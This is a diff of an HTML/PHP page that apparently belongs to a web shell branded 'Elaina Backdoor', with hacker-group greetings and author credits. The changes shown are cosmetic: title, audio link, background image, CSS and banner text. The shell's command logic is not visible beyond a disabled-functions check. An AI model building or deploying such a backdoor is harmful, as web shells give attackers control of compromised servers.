@@ -8,7 +8,7 @@ GreetZ: # Anon7 -  xRyukZ - Mr.Grim - mahou-shoujo.site #
 <html>
 <head>
 
-    <title>./Shikimori Backdoor\.</title>
+    <title>./Elaina Backdoor\.</title>
     <meta name="author" content="KosameAmegai">
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="description" content="i just want to live in peace">
@@ -26,7 +26,7 @@ GreetZ: # Anon7 -  xRyukZ - Mr.Grim - mahou-shoujo.site #
 
 
 
-<audio id="sec" __idm_id__="823202817"> <source src="000"></audio>
+<audio id="sec" __idm_id__="823202817"> <source src="https://j.top4top.io/m_2490dy9ki1.mp3"></audio>
 
 
 </center>
@@ -72,13 +72,12 @@ GreetZ: # Anon7 -  xRyukZ - Mr.Grim - mahou-shoujo.site #
 
 <style type='text/css'>
 @import url(http://fonts.googleapis.com/css?family=Share+Tech+Mono);
-body 
-{
-	background: url(https://pbs.twimg.com/media/EIqDuAjVAAEZscd?format=jpg) no-repeat center center fixed; 
+body {
+	background: url(https://asset.kompas.com/crops/gK5AeI1tic3JDobnVyoFhYi57wA=/0x0:1000x667/750x500/data/photo/2020/11/13/5fae76b403ea2.jpg) no-repeat center center fixed; 
     background-size: cover; 
     color: black
-}   
-  {
+}
+html {
     color: #ffffff;
     font-family: 'Share Tech Mono';
     font-size: 13px;
@@ -211,7 +210,7 @@ async function loadFile(file) {
 
 </script>
 <center>
-<font face="Bungee" size="5">Sh3llz Backd00r KosameAmegai ft Anon6host</font></center>
+<font face="Bungee" size="5">./Elaina Backdoor\.</font></center>
 <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
 <tr><td>
 <?php
@@ -231,7 +230,7 @@ if (empty($disfunc)) {
 }
 
 function author() {
-    echo "<center><br>mahou-shoujo.site - anon6host.my.id</center>";
+    echo "<center><br>mahou-shoujo.site - japan</center>";
     exit();
 }
 
